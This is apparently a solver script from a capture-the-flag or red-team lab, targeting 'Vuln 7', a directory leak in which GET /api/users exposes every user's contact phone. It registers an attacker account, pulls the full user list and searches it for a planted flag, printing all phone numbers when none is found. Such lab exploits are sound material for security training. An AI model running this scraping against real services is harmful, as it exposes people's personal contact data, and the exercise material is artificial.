import argparse
import sys

import requests

from _common import auth_headers, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN7_contact_phone_"


def main():
    ap = argparse.ArgumentParser(description="Vuln 7: directory leak via GET /api/users")
    ap.add_argument("--base", default="http://localhost:8080")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v7")
    ok(f"registered attacker {username}")

    r = requests.get(f"{args.base}/api/users", headers=auth_headers(token), timeout=10)
    r.raise_for_status()
    users = r.json()
    ok(f"GET /api/users returned {len(users)} entries")

    flags = []
    for u in users:
        phone = u.get("contact_phone") or ""
        if TARGET_MARKER in phone:
            flags.append((u["username"], phone))

    if not flags:
        info("no user with expected marker found. All phones:")
        for u in users:
            print(f"  {u.get('username')}: {u.get('contact_phone')!r}")
        sys.exit(2)

    for who, phone in flags:
        ok(f"flag from {who}: {phone}")


if __name__ == "__main__":
    main()
